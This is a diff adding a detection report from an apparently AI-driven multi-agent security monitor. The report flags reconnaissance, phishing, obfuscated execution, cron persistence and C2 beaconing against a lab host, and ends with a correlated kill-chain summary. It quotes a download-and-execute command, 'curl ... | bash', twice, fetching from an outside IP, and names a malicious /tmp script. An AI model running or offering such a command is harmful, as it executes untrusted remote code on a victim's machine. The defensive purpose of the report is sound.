@@ -1,0 +1,172 @@
+##########################################################################
+#                   AAKCD KILL-CHAIN DETECTION REPORT                    #
+#                         Antaeus AI (Team C03)                          #
+##########################################################################
+
+==========================================================================
+[MEDIUM] RECONNAISSANCE ALERT  (severity 7)
+==========================================================================
+Timestamp : 2026-10-01T12:24:13.250904+00:00
+Source    : 127.0.0.1  ->  target 10.10.10.30
+Agent     : Recon_Agent
+Summary   : An open FTP service (port 21) was detected on host 10.10.10.30, matching one of the high‑risk ports this agent monitors, indicating potential exposure to network service discovery (MITRE T1046).
+
+MITRE ATT&CK
+  Technique : T1046
+  Tactic    : Discovery
+
+Details
+  An open FTP service (port 21) was detected on host 10.10.10.30, matching
+  one of the high‑risk ports this agent monitors, indicating potential
+  exposure to network service discovery (MITRE T1046).
+
+Final Answer:
+  - Category          : network_recon
+  - Confidence        : high
+  - Severity          : 7
+  - Recommended action: Conduct a focused assessment of the FTP service, verify its necessity, and apply appropriate hardening or disable if not required.
+
+==========================================================================
+[MEDIUM] DELIVERY ALERT  (severity 10)
+==========================================================================
+Timestamp : 2026-10-01T12:24:16.272032+00:00
+Source    : 127.0.0.1  ->  target 10.10.10.30
+Agent     : Delivery_Agent
+Summary   : The email employs multiple watched phishing indicators—urgent language in the subject, claims of a suspended account, a request to "verify your account," a "click here" call‑to‑action, and a shortened Bit.ly link—matching the pattern of a phishing‑link delivery (MITRE T1566.002).
+
+MITRE ATT&CK
+  Technique : T1566.002
+  Tactic    : Initial Access
+
+Details
+  The email employs multiple watched phishing indicators—urgent language
+  in the subject, claims of a suspended account, a request to "verify your
+  account," a "click here" call‑to‑action, and a shortened Bit.ly
+  link—matching the pattern of a phishing‑link delivery (MITRE T1566.002).
+
+Final Answer:
+  - Category          : email_phishing
+  - Confidence        : high
+  - Severity          : 10
+  - Recommended action: Quarantine the message, block the sender domain, and submit the email for URL reputation analysis and user awareness notification.
+
+==========================================================================
+[MEDIUM] EXPLOITATION ALERT  (severity 10)
+==========================================================================
+Timestamp : 2026-10-01T12:24:20.738370+00:00
+Source    : 127.0.0.1  ->  target 10.10.10.30
+Agent     : Exploitation_Agent
+Summary   : The command echoes a Base64‑encoded string, decodes it with `base64 -d`, and pipes the result straight into `bash`.
+
+MITRE ATT&CK
+  Technique : T1027
+  Tactic    : Defense Evasion
+
+Details
+  The command echoes a Base64‑encoded string, decodes it with `base64 -d`,
+  and pipes the result straight into `bash`. The decoded payload contains
+  a `curl -s http://45.33.12.9/x.sh | bash` download‑and‑execute pattern,
+  matching the watched obfuscation indicators (base64, curl | bash). This
+  is a classic obfuscated execution (MITRE T1027) and strongly suggests
+  malicious intent.
+
+Final Answer:
+  - Category          : obfuscated_execution
+  - Confidence        : high
+  - Severity          : 10
+  - Recommended action: Isolate the affected host, capture its command history and network traffic, block the external IP (45.33.12.9), and begin a full malware investigation.
+
+==========================================================================
+[MEDIUM] INSTALLATION ALERT  (severity 9)
+==========================================================================
+Timestamp : 2026-10-01T12:24:24.308064+00:00
+Source    : 127.0.0.1  ->  target 10.10.10.30
+Agent     : Installation_Agent
+Summary   : The cron entry runs every minute and executes a script located in /tmp, a world‑writable temporary directory commonly abused for malicious persistence.
+
+MITRE ATT&CK
+  Technique : T1053.003
+  Tactic    : Persistence
+
+Details
+  The cron entry runs every minute and executes a script located in /tmp,
+  a world‑writable temporary directory commonly abused for malicious
+  persistence. This matches the agent’s watchlist for persistence via
+  scripts in /tmp and for frequent scheduled execution, indicating a
+  likely malicious scheduled‑task persistence mechanism (MITRE T1053.003).
+
+Final Answer:
+  - Category          : scheduled_task_persistence
+  - Confidence        : high
+  - Severity          : 9
+  - Recommended action: Delete the cron entry, quarantine or analyze /tmp/evil.sh, and review related system logs for additional abuse.
+
+==========================================================================
+[MEDIUM] COMMAND & CONTROL ALERT  (severity 8)
+==========================================================================
+Timestamp : 2026-10-01T12:24:28.549231+00:00
+Source    : 127.0.0.1  ->  target 10.10.10.30
+Agent     : C2_Agent
+Summary   : The host 10.10.10.30 is repeatedly contacting a raw IP address (45.33.12.9) on an uncommon HTTPS port (8443) every ~60 seconds with identical 128‑byte outbound and 96‑byte inbound payloads.
+
+MITRE ATT&CK
+  Technique : T1071.001
+  Tactic    : Command and Control
+
+Details
+  The host 10.10.10.30 is repeatedly contacting a raw IP address
+  (45.33.12.9) on an uncommon HTTPS port (8443) every ~60 seconds with
+  identical 128‑byte outbound and 96‑byte inbound payloads. No legitimate
+  browser process is tied to the traffic and the User‑Agent string
+  (“HttpBrowser/1.0”) does not match any known client, matching the
+  watched C2 beacon indicators (raw IP, uncommon port, periodic interval,
+  user‑agent mismatch). This pattern strongly suggests covert
+  command‑and‑control communication.
+
+Final Answer:
+  - Category          : c2_beaconing
+  - Confidence        : high
+  - Severity          : 8
+  - Recommended action: Quarantine the host and block outbound connections to 45.33.12.9:8443 while initiating a forensic investigation of the originating process and related binaries.
+
+##########################################################################
+#              CORRELATED KILL-CHAIN SUMMARY (Coordinator)               #
+##########################################################################
+==========================================================================
+[MEDIUM] KILL-CHAIN CORRELATION ALERT  (severity 10)
+==========================================================================
+Timestamp : 2026-10-01T12:23:32.948245+00:00
+Source    : 127.0.0.1  ->  target 10.10.10.30
+Agent     : Coordinator_Agent
+Summary   : At 12:21 UTC the Recon_Agent began probing 10.10.10.30 and repeatedly reported that the FTP service on port 21 was exposed, a classic foothold for lateral movement and credential harvesting.
+
+MITRE ATT&CK
+  Technique : T1027,T1046,T1566.002
+  Tactic    : Defense Evasion -> Discovery -> Initial Access
+
+Details
+  At 12:21 UTC the Recon_Agent began probing 10.10.10.30 and repeatedly
+  reported that the FTP service on port 21 was exposed, a classic foothold
+  for lateral movement and credential harvesting. Within seconds the
+  Delivery_Agent flagged a spear‑phishing email using a look‑alike PayPal
+  domain, urgent language and a shortened Bit.ly URL (T1566.002). The
+  timing suggests the phishing payload was coordinated with the earlier
+  scan – the attacker likely used the open FTP service to stage or host
+  malicious content. Shortly after the email alerts, the
+  Exploitation_Agent logged a Base64‑encoded command that decoded to `curl
+  -s http://45.33.12.9/x.sh | bash`, indicating the victim executed a
+  download‑and‑execute script via an obfuscated shell command (T1027). The
+  pattern repeats with additional scans, phishing alerts, and the same
+  obfuscation technique, confirming a multi‑stage, coordinated attack that
+  moved from reconnaissance to credential‑phishing and remote code
+  execution on the same host.
+
+Final Answer:
+  - Category          : kill_chain_correlation
+  - Confidence        : high
+  - Severity          : 10
+  - Recommended action: Immediately isolate 10.10.10.30 from the network, block outbound traffic to 45.33.12.9, and begin a full forensic investigation to remove the malicious script, reset compromised credentials, and harden or disable the exposed FTP service.
+
+==========================================================================
+Phases reporting a detection (severity >= 1): 5 of 5
+==========================================================================
